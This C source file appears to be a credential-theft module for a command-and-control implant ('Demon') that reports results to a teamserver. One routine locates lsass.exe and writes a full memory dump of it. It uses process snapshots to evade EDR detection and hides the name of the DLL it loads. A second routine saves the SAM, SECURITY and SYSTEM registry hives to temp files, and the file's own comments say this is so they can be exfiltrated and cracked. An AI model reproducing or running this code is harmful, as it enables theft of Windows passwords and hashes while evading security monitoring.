/*
 * Command_Creds.c - HVC-032 credential-access commands
 *
 * DEMON_CREDS_LSASS : dump lsass memory to a minidump via MiniDumpWriteDump.
 *                     Uses PssCaptureSnapshot when available so lsass is never
 *                     opened directly by the dump call (EDR bypass).
 * DEMON_CREDS_SAM   : save SAM / SECURITY / SYSTEM registry hives to temp files
 *                     via RegSaveKeyExW so they can be exfiltrated and cracked offline.
 */

#include <Demon.h>
#include <common/Macros.h>
#include <core/Command.h>
#include <core/Package.h>
#include <core/MiniStd.h>
#include <core/Parser.h>
#include <core/Win32.h>
#include <commands/Command_Creds.h>

/* dbghelp.dll - loaded inline at call time, not at startup. */
#include <dbghelp.h>

/* processsnapshot.h may not be present on all MinGW installs.
 * Define the required types and flag values inline from MSDN. */
#ifndef _PROCESSSNAPSHOT_H_
typedef DWORD PSS_CAPTURE_FLAGS;
typedef PVOID HPSS;
#define PSS_CAPTURE_VA_CLONE                  0x00000001
#define PSS_CAPTURE_HANDLES                   0x00000004
#define PSS_CAPTURE_HANDLE_BASIC_INFORMATION  0x00000010
#define PSS_CAPTURE_THREADS                   0x00000080
#define PSS_CAPTURE_THREAD_CONTEXT            0x00000100
#endif

/* ---- typedefs for all function pointers used in this file ---- */

typedef DWORD (WINAPI *fnGetTempPathW)( DWORD nBufferLength, LPWSTR lpBuffer );
typedef HANDLE (WINAPI *fnCreateFileW)( LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE );
typedef DWORD (WINAPI *fnPssCaptureSnapshot)( HANDLE hProcess, PSS_CAPTURE_FLAGS CaptureFlags, DWORD ThreadContextFlags, HPSS *SnapshotHandle );
typedef DWORD (WINAPI *fnPssFreeSnapshot)( HANDLE hProcess, HPSS SnapshotHandle );
typedef BOOL  (WINAPI *fnMiniDumpWriteDump)( HANDLE hProcess, DWORD ProcessId, HANDLE hFile, MINIDUMP_TYPE DumpType, PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, PMINIDUMP_CALLBACK_INFORMATION CallbackParam );
typedef LONG  (WINAPI *fnRegOpenKeyExW)( HKEY hKey, LPCWSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult );
typedef LONG  (WINAPI *fnRegSaveKeyExW)( HKEY hKey, LPCWSTR lpFile, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD Flags );
typedef LONG  (WINAPI *fnRegCloseKey)( HKEY hKey );

/* ----------------------------------------------------------------
 * CommandCreds
 *   DataArgs - parser positioned after the CommandID field.
 *              Layout: SubCommand(int32) [, FileName(wstring)]
 * ---------------------------------------------------------------- */
VOID CommandCreds( IN PPARSER DataArgs )
{
    PPACKAGE Package    = PackageCreate( DEMON_COMMAND_CREDS );
    SHORT    SubCommand = (SHORT) ParserGetInt32( DataArgs );

    /* Echo back the sub-command so the client can route the response. */
    PackageAddInt32( Package, SubCommand );

    switch ( SubCommand )
    {

        /* --------------------------------------------------------
         * DEMON_CREDS_LSASS
         * Find lsass.exe, snapshot it with PssCaptureSnapshot,
         * write a full minidump via dbghelp!MiniDumpWriteDump,
         * report the output path back to the teamserver.
         * -------------------------------------------------------- */
        case DEMON_CREDS_LSASS: PUTS( "Creds::Lsass" )
        {
            PSYSTEM_PROCESS_INFORMATION SysInfo     = NULL;
            PSYSTEM_PROCESS_INFORMATION PtrInfo     = NULL;
            SIZE_T                      SnapSize    = 0;
            NTSTATUS                    NtStatus    = STATUS_SUCCESS;
            DWORD                       LsassPid    = 0;
            HANDLE                      hLsass      = NULL;
            HANDLE                      hFile       = NULL;
            HPSS                        Snapshot    = NULL;
            BOOL                        UsedPss     = FALSE;
            BOOL                        DumpOk      = FALSE;
            PVOID                       hDbg        = NULL;
            PVOID                       pMiniDump   = NULL;
            WCHAR                       DumpPath[ MAX_PATH ] = { 0 };
            UINT32                      FileNameLen  = 0;
            PWCHAR                      FileName     = NULL;

            /* Read the optional output path from the parser. */
            FileName = ParserGetWString( DataArgs, &FileNameLen );

            /* --- Step 1: find lsass PID via process snapshot --- */
            if ( ! NT_SUCCESS( NtStatus = ProcessSnapShot( &SysInfo, &SnapSize ) ) )
            {
                PRINTF( "Creds::Lsass - ProcessSnapShot failed: %lx\n", NtStatus )
                PackageAddInt32( Package, FALSE );
                break;
            }

            /* Save original pointer so we can free it later. */
            PtrInfo = SysInfo;

            /* Walk the process list looking for "lsass.exe". */
            while ( TRUE )
            {
                if ( SysInfo->ImageName.Buffer && SysInfo->ImageName.Length > 0 )
                {
                    /* Case-insensitive wide string search. */
                    WCHAR LsassName[] = { 'l','s','a','s','s','.','e','x','e', 0 };
                    if ( WcsIStr( SysInfo->ImageName.Buffer, LsassName ) )
                    {
                        LsassPid = (DWORD)(ULONG_PTR) SysInfo->UniqueProcessId;
                        PRINTF( "Creds::Lsass - found PID %lu\n", LsassPid )
                        break;
                    }
                }

                if ( SysInfo->NextEntryOffset == 0 )
                    break;

                SysInfo = C_PTR( U_PTR( SysInfo ) + SysInfo->NextEntryOffset );
            }

            /* Free the snapshot buffer regardless of outcome. */
            if ( PtrInfo )
            {
                MemSet( PtrInfo, 0, SnapSize );
                MmHeapFree( PtrInfo );
                PtrInfo = NULL;
                SysInfo = NULL;
            }

            if ( LsassPid == 0 )
            {
                PUTS( "Creds::Lsass - could not find lsass.exe" )
                PackageAddInt32( Package, FALSE );
                break;
            }

            /* --- Step 2: open lsass --- */
            hLsass = ProcessOpen( LsassPid, PROCESS_ALL_ACCESS );
            if ( ! hLsass )
            {
                PUTS( "Creds::Lsass - ProcessOpen failed" )
                PackageAddInt32( Package, FALSE );
                PACKAGE_ERROR_WIN32
                break;
            }

            /* --- Step 3: build the output file path --- */
            if ( FileName && FileName[ 0 ] != L'\0' )
            {
                /* Caller supplied an explicit path. */
                StringCopyW( DumpPath, FileName );
            }
            else
            {
                /* Fall back to %TEMP%\lsass.dmp */
                if ( Instance->Win32.GetTempPathW )
                {
                    ( (fnGetTempPathW) Instance->Win32.GetTempPathW )( MAX_PATH, DumpPath );
                }
                StringConcatW( DumpPath, L"lsass.dmp" );
            }

            PRINTF( "Creds::Lsass - dump path: %ls\n", DumpPath )

            /* --- Step 4: create / overwrite the output file --- */
            if ( ! Instance->Win32.CreateFileW )
            {
                PUTS( "Creds::Lsass - CreateFileW not available" )
                PackageAddInt32( Package, FALSE );
                goto LSASS_CLEANUP;
            }

            hFile = ( (fnCreateFileW) Instance->Win32.CreateFileW )(
                DumpPath,
                GENERIC_WRITE,
                0,
                NULL,
                CREATE_ALWAYS,
                FILE_ATTRIBUTE_NORMAL,
                NULL );

            if ( ! hFile || hFile == INVALID_HANDLE_VALUE )
            {
                PUTS( "Creds::Lsass - CreateFileW failed" )
                PackageAddInt32( Package, FALSE );
                PACKAGE_ERROR_WIN32
                hFile = NULL;
                goto LSASS_CLEANUP;
            }

            /* --- Step 5: try PssCaptureSnapshot (EDR-friendlier) --- */
            if ( Instance->Win32.PssCaptureSnapshot )
            {
                /* VA_CLONE | HANDLES | HANDLE_BASIC_INFORMATION | THREADS | THREAD_CONTEXT */
                PSS_CAPTURE_FLAGS PssFlags = PSS_CAPTURE_VA_CLONE
                                           | PSS_CAPTURE_HANDLES
                                           | PSS_CAPTURE_HANDLE_BASIC_INFORMATION
                                           | PSS_CAPTURE_THREADS
                                           | PSS_CAPTURE_THREAD_CONTEXT;
                DWORD PssRet = ( (fnPssCaptureSnapshot) Instance->Win32.PssCaptureSnapshot )(
                    hLsass, PssFlags, 0, &Snapshot );
                UsedPss = ( PssRet == ERROR_SUCCESS && Snapshot != NULL );
                PRINTF( "Creds::Lsass - PssCaptureSnapshot: %s (ret=%lu)\n", UsedPss ? "ok" : "failed", PssRet )
            }

            /* --- Step 6: load dbghelp.dll inline and resolve MiniDumpWriteDump --- */
            {
                /* Build the module name with HideChar so the string is not a literal. */
                CHAR DbgHelpName[ 12 ] = { 0 };
                DbgHelpName[ 0  ] = HideChar( 'd' );
                DbgHelpName[ 1  ] = HideChar( 'b' );
                DbgHelpName[ 2  ] = HideChar( 'g' );
                DbgHelpName[ 3  ] = HideChar( 'h' );
                DbgHelpName[ 4  ] = HideChar( 'e' );
                DbgHelpName[ 5  ] = HideChar( 'l' );
                DbgHelpName[ 6  ] = HideChar( 'p' );
                DbgHelpName[ 7  ] = HideChar( '.' );
                DbgHelpName[ 8  ] = HideChar( 'd' );
                DbgHelpName[ 9  ] = HideChar( 'l' );
                DbgHelpName[ 10 ] = HideChar( 'l' );
                DbgHelpName[ 11 ] = HideChar( '\0' );

                hDbg = LdrModuleLoad( DbgHelpName );
                MemZero( DbgHelpName, sizeof( DbgHelpName ) );
            }

            if ( hDbg )
            {
                pMiniDump = LdrFunctionAddr( hDbg, H_FUNC_MINIWRITEDUMP );
            }

            if ( ! pMiniDump )
            {
                PUTS( "Creds::Lsass - MiniDumpWriteDump not resolved" )
                PackageAddInt32( Package, FALSE );
                goto LSASS_CLEANUP;
            }

            /* --- Step 7: write the dump ---
             * When PSS succeeded pass the snapshot handle instead of the live
             * process - this avoids a direct lsass handle in the dump call. */
            {
                HANDLE DumpTarget = UsedPss ? (HANDLE) Snapshot : hLsass;

                DumpOk = ( (fnMiniDumpWriteDump) pMiniDump )(
                    DumpTarget,
                    LsassPid,
                    hFile,
                    MiniDumpWithFullMemory, /* 0x00000002 */
                    NULL,
                    NULL,
                    NULL );

                PRINTF( "Creds::Lsass - MiniDumpWriteDump: %s\n", DumpOk ? "ok" : "failed" )
            }

            /* Success / failure flag + path reported back. */
            PackageAddInt32( Package, DumpOk ? TRUE : FALSE );
            if ( DumpOk )
            {
                PackageAddWString( Package, DumpPath );
            }

            /* --- Step 8: cleanup --- */
            LSASS_CLEANUP:
            if ( UsedPss && Instance->Win32.PssFreeSnapshot )
            {
                ( (fnPssFreeSnapshot) Instance->Win32.PssFreeSnapshot )( hLsass, Snapshot );
                Snapshot = NULL;
            }

            if ( hFile && hFile != INVALID_HANDLE_VALUE )
            {
                SysNtClose( hFile );
                hFile = NULL;
            }

            if ( hLsass )
            {
                SysNtClose( hLsass );
                hLsass = NULL;
            }

            break;
        }

        /* --------------------------------------------------------
         * DEMON_CREDS_SAM
         * Save SAM, SECURITY, and SYSTEM registry hives to temp
         * files.  Requires SeBackupPrivilege.
         * -------------------------------------------------------- */
        case DEMON_CREDS_SAM: PUTS( "Creds::Sam" )
        {
            WCHAR SamPath[ MAX_PATH ]      = { 0 };
            WCHAR SecPath[ MAX_PATH ]      = { 0 };
            WCHAR SysPath[ MAX_PATH ]      = { 0 };
            WCHAR TmpBase[ MAX_PATH ]      = { 0 };
            HKEY  hKey                     = NULL;
            LONG  Res                      = 0;
            BOOL  AnySaved                 = FALSE;

            /* Verify required function pointers are available. */
            if ( ! Instance->Win32.RegOpenKeyExW  ||
                 ! Instance->Win32.RegSaveKeyExW  ||
                 ! Instance->Win32.RegCloseKey    ||
                 ! Instance->Win32.GetTempPathW   )
            {
                PUTS( "Creds::Sam - required functions not available" )
                PackageAddInt32( Package, FALSE );
                break;
            }

            /* Retrieve %TEMP% base path. */
            ( (fnGetTempPathW) Instance->Win32.GetTempPathW )( MAX_PATH, TmpBase );

            /* Build individual dump paths. */
            StringCopyW( SamPath, TmpBase );  StringConcatW( SamPath, L"sam.dmp" );
            StringCopyW( SecPath, TmpBase );  StringConcatW( SecPath, L"security.dmp" );
            StringCopyW( SysPath, TmpBase );  StringConcatW( SysPath, L"system.dmp" );

            /* --- SAM hive --- */
            hKey = NULL;
            Res = ( (fnRegOpenKeyExW) Instance->Win32.RegOpenKeyExW )(
                HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hKey );
            if ( Res == ERROR_SUCCESS && hKey )
            {
                Res = ( (fnRegSaveKeyExW) Instance->Win32.RegSaveKeyExW )(
                    hKey, SamPath, NULL, REG_LATEST_FORMAT );
                ( (fnRegCloseKey) Instance->Win32.RegCloseKey )( hKey );
                hKey = NULL;

                if ( Res == ERROR_SUCCESS )
                {
                    PRINTF( "Creds::Sam - SAM saved: %ls\n", SamPath )
                    PackageAddWString( Package, SamPath );
                    AnySaved = TRUE;
                }
                else
                {
                    PRINTF( "Creds::Sam - RegSaveKeyExW(SAM) failed: %ld\n", Res )
                    PackageAddWString( Package, L"" );
                }
            }
            else
            {
                PRINTF( "Creds::Sam - RegOpenKeyExW(SAM) failed: %ld\n", Res )
                PackageAddWString( Package, L"" );
            }

            /* --- SECURITY hive --- */
            hKey = NULL;
            Res = ( (fnRegOpenKeyExW) Instance->Win32.RegOpenKeyExW )(
                HKEY_LOCAL_MACHINE, L"SECURITY", 0, KEY_READ, &hKey );
            if ( Res == ERROR_SUCCESS && hKey )
            {
                Res = ( (fnRegSaveKeyExW) Instance->Win32.RegSaveKeyExW )(
                    hKey, SecPath, NULL, REG_LATEST_FORMAT );
                ( (fnRegCloseKey) Instance->Win32.RegCloseKey )( hKey );
                hKey = NULL;

                if ( Res == ERROR_SUCCESS )
                {
                    PRINTF( "Creds::Sam - SECURITY saved: %ls\n", SecPath )
                    PackageAddWString( Package, SecPath );
                    AnySaved = TRUE;
                }
                else
                {
                    PRINTF( "Creds::Sam - RegSaveKeyExW(SECURITY) failed: %ld\n", Res )
                    PackageAddWString( Package, L"" );
                }
            }
            else
            {
                PRINTF( "Creds::Sam - RegOpenKeyExW(SECURITY) failed: %ld\n", Res )
                PackageAddWString( Package, L"" );
            }

            /* --- SYSTEM hive --- */
            hKey = NULL;
            Res = ( (fnRegOpenKeyExW) Instance->Win32.RegOpenKeyExW )(
                HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hKey );
            if ( Res == ERROR_SUCCESS && hKey )
            {
                Res = ( (fnRegSaveKeyExW) Instance->Win32.RegSaveKeyExW )(
                    hKey, SysPath, NULL, REG_LATEST_FORMAT );
                ( (fnRegCloseKey) Instance->Win32.RegCloseKey )( hKey );
                hKey = NULL;

                if ( Res == ERROR_SUCCESS )
                {
                    PRINTF( "Creds::Sam - SYSTEM saved: %ls\n", SysPath )
                    PackageAddWString( Package, SysPath );
                    AnySaved = TRUE;
                }
                else
                {
                    PRINTF( "Creds::Sam - RegSaveKeyExW(SYSTEM) failed: %ld\n", Res )
                    PackageAddWString( Package, L"" );
                }
            }
            else
            {
                PRINTF( "Creds::Sam - RegOpenKeyExW(SYSTEM) failed: %ld\n", Res )
                PackageAddWString( Package, L"" );
            }

            PackageAddInt32( Package, AnySaved ? TRUE : FALSE );
            break;
        }

        default:
            PRINTF( "Creds: unknown sub-command %d\n", SubCommand )
            PackageAddInt32( Package, FALSE );
            break;
    }

    PackageTransmit( Package );
}
